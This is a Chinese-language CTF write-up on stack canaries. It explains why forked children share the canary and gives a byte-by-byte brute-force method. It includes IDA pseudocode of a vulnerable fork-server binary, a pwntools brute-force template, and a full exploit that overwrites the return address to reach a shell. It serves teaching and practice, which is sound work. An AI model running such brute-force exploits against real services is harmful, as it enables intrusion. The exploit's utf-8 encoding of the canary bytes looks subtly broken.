## Canary介绍

Canary表示栈的报警保护，即在函数返回值之前添加的一串随机数（不超过机器字长，也叫Cookie）。Canary形式为`aaaax\00`末位为0x00（/x00），提供了覆盖最后一字节输出泄露Canary的可能。

如果出现缓冲区溢出，覆盖到这个地方会改变此处的数值，程序执行到此处，检查Canary值如果和开始不一样会崩溃，以保护返回地址，gcc中用`-fno-stack-protector`参数禁用栈保护



## Canary爆破原理

虽然每次进程重启后Canary不同，但同一个进程中的不同线程的Canary相同，并且通过fork函数创建的子进程中的Canary也相同（fork函数会直接拷贝父进程的内存）

最低位0x00，之后逐次爆破，爆破不成功程序就崩溃，爆破成功就进行下面的逻辑，由此判断爆破是否成功。这样逐个字节将Canary爆破出来



## 实战

下载附件，使用pwntools自带的checksec检查文件的保护情况，发现是32位程序，开启了栈上不可执行（NX）和栈的报警保护（Canary）

将文件拖进IDA，F5反编译得到伪代码，发现main函数中存在fork函数，这是爆破Canary的重点

```c
//IDA反编译得到的伪代码
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // [esp+Ch] [ebp-Ch]

  init();
  while ( 1 )
  {
    v3 = fork();
    if ( v3 < 0 )
      break;
    if ( v3 )
    {
      wait(0);
    }
    else
    {
      puts("welcome");
      fun();
      puts("recv sucess");
    }
  }
  puts("fork error");
  exit(0);
}
```



进入fun函数，发现栈溢出：`read(0, buf, 0x78u)`可以输入0x78的内容，但是buf的空间只有（0x70-0xC）。另外v2就是保存Canary的变量

```c
unsigned int fun()
{
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v2; // [esp+6Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  read(0, buf, 0x78u);
  return __readgsdword(0x14u) ^ v2;
}
```



思路是逐位爆破Canary，用栈溢出填充垃圾字符直到Canary，然后尝试填充，若Canary正确就爆破 下一位；若错误程序就会执行fork重新运行。下面给出爆破Canary的通用模板：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')
local = 1
elf = ELF('./bin1')

if local:
    p = process('./bin1')
    #libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(3):
    for i in range(256):
        print("正在爆破Canary的第" + str(k+1)+"位")
        print("当前的字符为"+ chr(i))
        payload='a'*100 + canary + chr(i)
        print("当前payload为：",payload)
        p.send('a'*100 + canary + chr(i))
        data=p.recvuntil("welcome\n")
        print(data)
        if bytes("sucess",encoding='utf-8') in data:
            canary += chr(i)
            print("Canary is: " + canary)
            break

```



针对这道题的EXP:

```c
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')
local = 1
elf = ELF('./bin1')

if local:
    p = process('./bin1')
    #libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(3):
    for i in range(256):
        print("正在爆破Canary的第" + str(k+1)+"位" )
        print("当前的字符为"+ chr(i))
        payload='a'*100 + canary + chr(i)
        print("当前payload为：",payload)
        p.send('a'*100 + canary + chr(i))
        data=p.recvuntil("welcome\n")
        print(data)
        if bytes("sucess",encoding='utf-8') in data:
            canary += chr(i)
            print("Canary is: " + canary)
            break
addr = 0x0804863B
payload =b'A' * 100 + bytes(canary,encoding='utf-8') + b'A' * 12 + p32(addr)

p.send(payload)
p.interactive()

```

